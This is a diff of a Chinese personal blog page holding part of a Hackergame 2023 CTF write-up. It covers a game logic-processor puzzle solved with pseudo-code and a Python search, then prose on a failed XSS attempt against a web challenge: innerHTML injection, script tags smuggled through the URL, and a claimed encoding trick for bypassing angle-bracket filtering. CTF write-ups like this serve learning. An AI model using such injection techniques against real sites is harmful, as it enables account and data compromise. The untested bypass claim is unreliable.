+<p>所以s1&#x3D;1 s2&#x3D;0 s3&#x3D;1 s4&#x3D;0 s5&#x3D;0 s6&#x3D;1 s7&#x3D;0 s8&#x3D;1</p>
+<p>10100101</p>
+<p>接着看第二个的处理器，才明白原来这个processor是可以写代码的，这下终于有hackergame的感觉了，前面一直在想这题到底要干啥..&#x3D; &#x3D;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">t=s1&lt;&lt;7</span><br><span class="line">number=t</span><br><span class="line">t=s2&lt;&lt;6</span><br><span class="line">number=number+t</span><br><span class="line">...</span><br><span class="line">前面的等价于number=s1s2s3s4s5s6s7s8</span><br><span class="line">en=0</span><br><span class="line">i=0</span><br><span class="line">line26: if(i&gt;=16)goto:line33</span><br><span class="line">fl0=i^2</span><br><span class="line">if(fl0!=number)goto line31</span><br><span class="line">en=1</span><br><span class="line">goto line33</span><br><span class="line">line31: i=i+1</span><br><span class="line">goto line26</span><br><span class="line">line33: fl1=(0==s1)</span><br><span class="line">fl2=(s6==0)</span><br><span class="line">fl3=(fl1 or fl2)</span><br><span class="line">if(fl3 == 0) goto line38</span><br><span class="line">en = 0</span><br><span class="line">line38: generator1_state = en</span><br><span class="line">panel1_state = en</span><br></pre></td></tr></table></figure>
+
+<p>一定要触发到en&#x3D;1，所以要让fl0&#x3D;&#x3D;number，且满足i&lt;16</p>
+<p>必须有fl3&#x3D;0，又一定fl1&#x3D;1，故fl2&#x3D;1，即s6&#x3D;0</p>
+<p>有这个s6&#x3D;0 s1&#x3D;0和i&lt;16的约束条件后写个代码跑一下就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Correcting the mistake and trying again</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize possible values list</span></span><br><span class="line">possible_binary_values = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop through possible values of i (from 0 to 15)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    number = i ** <span class="number">2</span></span><br><span class="line">    <span class="comment"># Convert number to binary and take the right-most 8 bits (excluding the &#x27;0b&#x27; prefix)</span></span><br><span class="line">    num_bin = <span class="built_in">bin</span>(number)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Check conditions for s1 and s6</span></span><br><span class="line">    s1 = <span class="built_in">int</span>(num_bin[<span class="number">0</span>])</span><br><span class="line">    s6 = <span class="built_in">int</span>(num_bin[<span class="number">5</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># If conditions are met, append to possible_binary_values</span></span><br><span class="line">    <span class="keyword">if</span> s1 != <span class="number">0</span> <span class="keyword">and</span> s6 != <span class="number">0</span>:</span><br><span class="line">        possible_binary_values.append(num_bin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最终的序列是11000100</p>
+<p>现在看第三个处理器，代码如下：（中间还点错了别的地方的逻辑处理器，还在想怎么这个代码变得那么抽象）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">conveyor2 = s1</span><br><span class="line">gate1_enable = s2</span><br><span class="line">nsw3= (s3==0)</span><br><span class="line">reactor1=nsw3</span><br><span class="line">reactor2=nsw3</span><br><span class="line">conduit1_enable = s4</span><br><span class="line">conduit2_enable = s4</span><br><span class="line">mixer1_enable = s5</span><br><span class="line">extractor1_enable = s6</span><br><span class="line">meltdown1_enable = s7</span><br><span class="line">meltdown2_enable = s7</span><br><span class="line">result = s8 == s9</span><br><span class="line">if (result == 1) go to END</span><br><span class="line"></span><br><span class="line">set_default_params...</span><br><span class="line"></span><br><span class="line">END:</span><br></pre></td></tr></table></figure>
+
+<p>从代码可以看出来s8一定要等于s9，s9又link到隔壁的s8，所以s8&#x3D;0</p>
+<p>现在初始状态是所有东西都是0</p>
+<p>meltdown是融毁，所以一定是0 -&gt; s7&#x3D;0</p>
+<p>extractor肯定要抽水，所以是1，s6&#x3D;1</p>
+<p>mixer&#x3D;1 -&gt; s5&#x3D;1</p>
+<p>conduit看起来是放水的，应该设置为0，则s4&#x3D;0</p>
+<p>s3跟反应堆连在一起，先不管，看起来最后要是1</p>
+<p>s1是阀门，已经用生命试探得到要关上了。</p>
+<p>s2是转换器</p>
+<p>所以应该是:10001100</p>
+<p>但是实际情况好像是抽水抽不上来，思考了一下应该是有执行顺序，根据合理的执行顺序操作了一下就让他跑起来了。</p>
+<p>最终答案是10100101 11000100 10001100  01110111</p>
+<p>10100101110001001000110001110111</p>
+<h2 id="微积分计算小练习2-0"><a href="#微积分计算小练习2-0" class="headerlink" title="微积分计算小练习2.0"></a>微积分计算小练习2.0</h2><p>想了一个思路，但是卡在了innerhtml注入那里，结束前那个晚上玩到4点没搞出来，遂放弃，睡觉。</p>
+<p>思路是，先用innerhtml注入，把location段变成一个可以放代码的地方。然后让其可以在url那里加入<code>&lt;script&gt;&lt;/script&gt;</code>标签的脚本，并用get请求访问，此时这个脚本就会被执行，然后script脚本的内容是post表单到自己，此时就有输出。</p>
+<p>尝试了不少方法，但是都卡在xss payload的构造。</p>
+<p>也找到了方法绕过&lt;&gt;的显示，可以通过\xc3\xce的方式绕过。</p>
+<p>其他就不会了，等wp</p>
 
     
 
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          henry_y
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://henry-y.github.io/2023/11/04/hackergame2023WriteUp/" title="hackergame2022 Writeup" target="_blank">http://henry-y.github.io/2023/11/04/hackergame2023WriteUp/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
     
 
   </div>
@@ -242,16 +694,76 @@
     
 
     
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2023/11/04/hackergame2023WriteUp/">展开全文 >></a>
-    </p>
+
     
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://henry-y.github.io/2023/11/04/hackergame2023WriteUp/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
 
     
     <div class="clearfix"></div>
   </div>
   </div>
 </article>
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2023/07/15/2023%E6%98%A5%E5%AD%A3%E5%AD%A6%E6%9C%9F%E5%B0%8F%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2023春季学期小结</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -266,446 +778,33 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-2023春季学期小结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2023/07/15/2023%E6%98%A5%E5%AD%A3%E5%AD%A6%E6%9C%9F%E5%B0%8F%E7%BB%93/" target="_blank">2023春季学期小结</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2023/07/15/2023%E6%98%A5%E5%AD%A3%E5%AD%A6%E6%9C%9F%E5%B0%8F%E7%BB%93/" class="archive-article-date">
-        <time datetime="2023-07-15T15:11:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-07-15</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>一直想动笔记一记过去的这些日子，奈何这个学期实在是太忙了，期末考试结束后也忙于旅行和搬宿舍等诸多事宜，没能好好静下来写一写，而现今搬宿舍事宜已然处理完毕，坐在前往厦门听彩虹合唱团的动车上，终于掏出ipad打算写点什么东西，写点什么都好。</p>
-<p>一个学期眨眼间就过去了，若要以几个词汇概括，那大概是忙碌，充实，又偶尔迷茫的。</p>
-    
-    <a class="article-more-a" href="/2023/07/15/2023%E6%98%A5%E5%AD%A3%E5%AD%A6%E6%9C%9F%E5%B0%8F%E7%BB%93/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2023/07/15/2023%E6%98%A5%E5%AD%A3%E5%AD%A6%E6%9C%9F%E5%B0%8F%E7%BB%93/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">碎碎念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hackergame%E5%90%AF%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">hackergame启动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%B6%E5%A5%B6%E7%9A%84%E7%9D%A1%E5%89%8Dflag%E6%95%85%E4%BA%8B"><span class="toc-number">3.</span> <span class="toc-text">奶奶的睡前flag故事</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Git-Git"><span class="toc-number">4.</span> <span class="toc-text">Git? Git!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94"><span class="toc-number">5.</span> <span class="toc-text">猫咪问答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%873-0"><span class="toc-number">6.</span> <span class="toc-text">旅行照片3.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1-2"><span class="toc-number">6.1.</span> <span class="toc-text">题目 1-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-3-4"><span class="toc-number">6.2.</span> <span class="toc-text">题目 3-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-5-6"><span class="toc-number">6.3.</span> <span class="toc-text">题目 5-6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deeper-and-darker"><span class="toc-number">7.</span> <span class="toc-text">deeper and darker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E5%8D%9A%E4%BA%95%E5%AD%97%E6%A3%8B"><span class="toc-number">8.</span> <span class="toc-text">赛博井字棋</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E5%A7%94%E4%BC%9A%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="toc-number">9.</span> <span class="toc-text">组委会模拟器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%99%AB"><span class="toc-number">10.</span> <span class="toc-text">虫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON-in-YAML"><span class="toc-number">11.</span> <span class="toc-text">JSON $\in$ YAML</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E9%A2%91%E7%8E%87%E6%98%9F%E7%90%83"><span class="toc-number">12.</span> <span class="toc-text">高频率星球</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker-for-Everyone"><span class="toc-number">13.</span> <span class="toc-text">Docker for Everyone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-%E9%9B%86%E9%82%AE%E5%86%8C"><span class="toc-number">14.</span> <span class="toc-text">HTTP 集邮册</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%83%9C%E5%AD%97%E5%A6%82%E9%87%912-0"><span class="toc-number">15.</span> <span class="toc-text">惜字如金2.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E5%9E%8B%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E6%98%9F%E7%90%83"><span class="toc-number">16.</span> <span class="toc-text">小型大语言模型星球</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83"><span class="toc-number">17.</span> <span class="toc-text">低带宽星球</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E5%BC%8F%E6%98%9F%E7%90%83"><span class="toc-number">18.</span> <span class="toc-text">流式星球</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%89%93%E5%BC%80-x2F-flag"><span class="toc-number">19.</span> <span class="toc-text">为什么要打开&#x2F;flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Komm-susser-Flagge"><span class="toc-number">20.</span> <span class="toc-text">Komm, süsser Flagge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E7%9A%84%E6%AD%A5%E9%AA%A4%E5%92%8C%E6%A0%87%E5%BF%97%E4%BD%8D%E5%8F%98%E5%8C%96%EF%BC%9A"><span class="toc-number">20.1.</span> <span class="toc-text">三次握手的步骤和标志位变化：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E5%BF%97%E4%BD%8D%E7%9A%84%E5%8F%98%E5%8C%96%EF%BC%9A"><span class="toc-number">20.2.</span> <span class="toc-text">标志位的变化：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%98%9F%E6%AD%A7%E9%80%94"><span class="toc-number">21.</span> <span class="toc-text">异星歧途</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%AE%E7%A7%AF%E5%88%86%E8%AE%A1%E7%AE%97%E5%B0%8F%E7%BB%83%E4%B9%A02-0"><span class="toc-number">22.</span> <span class="toc-text">微积分计算小练习2.0</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
 
-  
-    <article id="post-start" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2022/12/02/start/" target="_blank">Hello World!</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2022/12/02/start/" class="archive-article-date">
-        <time datetime="2022-12-02T15:05:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-12-02</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>时隔三年终于重新捡起了hexo，就是没想到再次配置差不多这天居然正好是自己的生日。</p>
-<p>希望能够好好维护不要像三年前那样用一会就扔了。</p>
-<p>但是博客园那边的博客实在有点多，决定只把大一开学至今写的东西同步过来，但没想到加上昨天写的那篇rsa加密的博文都只有3篇，果然只有高中打OI那会才有强烈的写博客欲望。<del>现在的我好懒啊..</del></p>
-<p>总之，Hello World！</p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2022/12/02/start/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
 
 
 
 
-  
-    <article id="post-非对称加密" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2022/12/02/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/" target="_blank">非对称加密与RSA算法初探</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2022/12/02/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/" class="archive-article-date">
-        <time datetime="2022-12-02T13:26:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-12-02</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>其实高中就大概了解过这是个什么原理，奈何一年半的高考备考让脑子退化严重，最近都在重新学以前学过的东西，在打算自己重新把 hexoblog 搭起来之后就去复习了一下Git的命令怎么用，上传ssh的时候就顺便把非对称加密的东西重新学了一下，于是出现了这篇笔记。</p>
-    
-    <a class="article-more-a" href="/2022/12/02/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">密码学</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2022/12/02/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
 
 
 
 
-  
-    <article id="post-封校小记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2022/11/23/%E5%B0%81%E6%A0%A1%E5%B0%8F%E8%AE%B0/" target="_blank">封校小记</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2022/11/23/%E5%B0%81%E6%A0%A1%E5%B0%8F%E8%AE%B0/" class="archive-article-date">
-        <time datetime="2022-11-23T09:41:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-23</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>   翻相册之时发现封校已然一月整，困于宿舍的无趣生活不免催生摆烂心态，各ddl重压下的情形下反而更加有记一记近日生活的欲望，本想压一压等周末把作业高差不多再写，不过“ddl只会不断叠叠叠”的认识还是让我现在便打开了博客园的后台。</p>
-<p>​	但是因为之前是在博客园更新的好像把博文转过来被博客园的图床gank了，但是又懒得把那十多张照片换个图床，所以更好的阅读体验<a target="_blank" rel="noopener" href="https://www.cnblogs.com/henry-1202/p/16918421.html">Click here</a></p>
-    
-    <a class="article-more-a" href="/2022/11/23/%E5%B0%81%E6%A0%A1%E5%B0%8F%E8%AE%B0/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2022/11/23/%E5%B0%81%E6%A0%A1%E5%B0%8F%E8%AE%B0/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Hackergame2022_Writeup" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2022/10/29/Hackergame2022_Writeup/" target="_blank">hackergame2022 Writeup</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2022/10/29/Hackergame2022_Writeup/" class="archive-article-date">
-        <time datetime="2022-10-29T05:01:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-29</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>萌新的第一次hackergame记录！</p>
-    
-    <a class="article-more-a" href="/2022/10/29/Hackergame2022_Writeup/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2022/10/29/Hackergame2022_Writeup/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-  
 
 
           </div>
@@ -733,8 +832,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
